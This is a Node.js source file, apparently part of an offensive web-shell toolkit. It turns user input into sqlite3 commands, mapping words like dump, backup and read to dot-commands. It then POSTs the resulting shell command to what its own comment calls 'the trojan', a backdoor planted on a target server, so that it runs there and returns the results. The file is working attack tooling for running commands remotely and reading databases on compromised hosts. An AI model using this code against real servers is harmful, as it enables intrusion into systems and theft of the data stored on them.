const errors = require('./util-http-error');
const shelly = require('shelly');

module.exports = function(config, req, cmd, callback) {

  // assert that the sqlite3 database has been specified
  if (! config.target.sqlite3.file) {
    return callback(new Error('config: sqlite3 database file unspecified.'));
  }

  // save the SQL query
  const query = dotcommand(cmd);

  // embed the sqlite3 query in a shell command as a batch
  cmd = shelly(
    'sqlite3 -header -column -batch ? ?',
    config.target.sqlite3.file,
    query
  );

  // initialize the request body
  const body = {
    cmd : cmd,
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    callback(err, response);
  });
};

// remap a command to a dotcommand if appropriate
const dotcommand = function(command) {

  // enumerate the dotcommands
  const dotcommands = [
    'backup'  , 'bail'    , 'databases' , 'dump'      , 'echo'    , 'exit'  ,
    'explain' , 'header'  , 'help'      , 'import'    , 'indices' , 'load'  ,
    'log'     , 'mode'    , 'nullvalue' , 'output'    , 'prompt'  , 'quit'  ,
    'read'    , 'restore' , 'schema'    , 'separator' , 'show'    , 'stats' ,
    'tables'  , 'timeout' , 'timer'     , 'trace'     , 'vfsname' , 'width' ,
  ];

  // if the command matches a dotcommand, return the remapped command
  for (var i = 0; i < dotcommands.length; i++) {
    var cmd   = dotcommands[i];
    var regex = new RegExp('^' + cmd, 'i');

    // test for a match
    if (regex.test(command)) {
      // preprend the dot on match
      return '.' + cmd;
    }
  }

  // otherwise, return the command unaltered
  return command;
};

